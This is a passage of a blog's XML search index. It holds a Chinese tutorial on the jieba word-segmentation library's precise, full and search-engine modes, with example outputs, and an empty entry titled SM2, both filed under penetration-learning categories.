    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/JS_%E9%80%86%E5%90%91/python/%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="1jieba库使用"><a class="markdownIt-Anchor" href="#1jieba库使用"></a> 1.jieba库使用:</h2>
<p>jieba库是一款优秀的 Python 第三方中文分词库，jieba 支持三种分词模式：精简模式、全模式和搜索引擎模式，下面是三种模式的特点。</p>
<ul>
<li>
<p>精简模式：试图将语句最精确的切分，不存在冗余数据，适合做文本分析</p>
</li>
<li>
<p>全模式：将语句中所有可能是词的词语都切分出来，速度很快，但是存在冗余数据</p>
</li>
<li>
<p>搜索引擎模式：在精简模式的基础上，对长词再次进行切分</p>
</li>
</ul>
<h3 id="1精确模式"><a class="markdownIt-Anchor" href="#1精确模式"></a> 1.精确模式:</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">seg_str = <span class="string">&quot;好好学习，天天向上。&quot;</span></span><br><span class="line">jieba.lcut(seg_str)   ---返回一个列表</span><br><span class="line">		[<span class="string">&#x27;好好学习&#x27;</span>, <span class="string">&#x27;，&#x27;</span>, <span class="string">&#x27;天天向上&#x27;</span>, <span class="string">&#x27;。&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h3 id="2全模式"><a class="markdownIt-Anchor" href="#2全模式"></a> 2.全模式:</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">seg_str=<span class="string">&quot;好好学习，天天向上。&quot;</span></span><br><span class="line">jieba.lcut(seg_str, cut_all=<span class="literal">True</span>)</span><br><span class="line">          [<span class="string">&#x27;好好&#x27;</span>, <span class="string">&#x27;好好学&#x27;</span>, <span class="string">&#x27;好好学习&#x27;</span>, <span class="string">&#x27;好学&#x27;</span>, <span class="string">&#x27;学习&#x27;</span>, <span class="string">&#x27;，&#x27;</span>, <span class="string">&#x27;天天&#x27;</span>, <span class="string">&#x27;天天向上&#x27;</span>, <span class="string">&#x27;向上&#x27;</span>, <span class="string">&#x27;。&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h3 id="3搜索引擎模式"><a class="markdownIt-Anchor" href="#3搜索引擎模式"></a> 3.搜索引擎模式:</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">seg_str=<span class="string">&quot;好好学习，天天向上。&quot;</span></span><br><span class="line">jieba.lcut_for_search(seg_str)</span><br><span class="line">           [<span class="string">&#x27;好好&#x27;</span>, <span class="string">&#x27;好学&#x27;</span>, <span class="string">&#x27;学习&#x27;</span>, <span class="string">&#x27;好好学&#x27;</span>, <span class="string">&#x27;好好学习&#x27;</span>, <span class="string">&#x27;，&#x27;</span>, <span class="string">&#x27;天天&#x27;</span>, <span class="string">&#x27;向上&#x27;</span>, <span class="string">&#x27;天天向上&#x27;</span>, <span class="string">&#x27;。&#x27;</span>]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>JS_逆向</category>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>SM2</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/SM2/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>渗透学习</category>
        <category>密码学</category>
        <category>非对称密码(公钥密码)</category>
      </categories>
  </entry>
</search>
